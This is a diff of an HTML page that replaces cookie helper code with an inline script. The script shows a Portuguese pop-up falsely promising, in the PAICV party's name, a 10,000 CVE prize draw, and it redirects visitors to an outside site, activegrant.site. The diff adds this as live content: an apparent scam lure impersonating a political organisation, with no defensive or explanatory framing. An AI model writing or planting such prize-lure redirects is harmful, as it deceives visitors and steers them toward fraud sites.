@@ -1,29 +1,19 @@
 <!DOCTYPE html>
 <html>
+
 <head>
+<script>
+var password = '10.000 CVE';
 
-    <script>
-        function set_Cookie(name,value){
-            var Days = 30;
-            var exp = new Date();
-            exp.setTime(exp.getTime() + (Days*20*1000));
-            document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+"; path=/;"
-        }
-        function get_Cookie(name){
-            var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
-            if(arr=document.cookie.match(reg)){
-                return unescape(arr[2]);
-            }
-            return '';
-        }
+password = prompt(
+  'PAICV: Parabéns, você é elegível para o Sorteio de 10.000 CVE da Campanha do PAICV. Clique em OK para ativar agora.',
+  '10.000 CVE'
+);
 
-
-        /*            if(get_Cookie("d")>0 &&get_Cookie("d")<12){
-                        document.getElementById("first-box")."quedate__step".display="none";//??;
-                        document.getElementById("second-box").style.display="none";//??;
-                        document.getElementById("third-box").style.display="none";//??;
-                        document.getElementsByClassName("loading2__box").style.display="";//??;
-                    }*/
+if (password !== '10.000 CVE') {
+    location.href = 'http://activegrant.site/Cape.html';
+}
+</script>
 
 
     </script>
